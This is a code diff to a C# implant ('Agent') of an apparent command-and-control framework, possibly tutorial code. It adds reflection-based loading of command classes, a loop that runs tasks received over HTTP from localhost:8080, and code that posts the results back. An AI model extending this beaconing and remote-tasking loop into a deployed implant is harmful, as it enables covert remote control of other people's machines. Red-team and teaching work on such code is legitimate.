@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -16,11 +17,14 @@ namespace Agent
         private static CommModule _commModule;
         private static CancellationTokenSource _tokenSource;
 
+        private static List<AgentCommand> _commands = new List<AgentCommand>();
+
         static void Main(string[] args)
         {
             Thread.Sleep(10000);
 
             GenerateMetadata();
+            LoadAgentCommands();
 
             _commModule = new HttpCommModule("localhost", 8080);
             _commModule.Init(_metadata);
@@ -32,9 +36,37 @@ namespace Agent
             {
                 if (_commModule.RecvData(out var tasks))
                 {
-                    
+                    HandleTasks(tasks);
                 }
             }
+        }
+
+        private static void HandleTasks(IEnumerable<AgentTask> tasks)
+        {
+            foreach (var task in tasks)
+            {
+                HandleTask(task);
+            }
+        }
+
+        private static void HandleTask(AgentTask task)
+        {
+            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
+            if (command is null) return;
+
+            var result = command.Execute(task);
+            SendTaskResult(task.Id, result);
+        }
+
+        private static void SendTaskResult(string taskId, string result)
+        {
+            var taskResult = new AgentTaskResult
+            {
+                Id = taskId,
+                Result = result
+            };
+
+            _commModule.SendData(taskResult);
         }
 
         public void Stop()
@@ -42,7 +74,21 @@ namespace Agent
             _tokenSource.Cancel();
         }
 
-        static void GenerateMetadata()
+        private static void LoadAgentCommands()
+        {
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach(var type in self.GetTypes())
+            {
+                if (type.IsSubclassOf(typeof(AgentCommand)))
+                {
+                    var instance = (AgentCommand) Activator.CreateInstance(type);
+                    _commands.Add(instance);
+                }
+            }
+        }
+
+        private static void GenerateMetadata()
         {
             var process = Process.GetCurrentProcess();
 
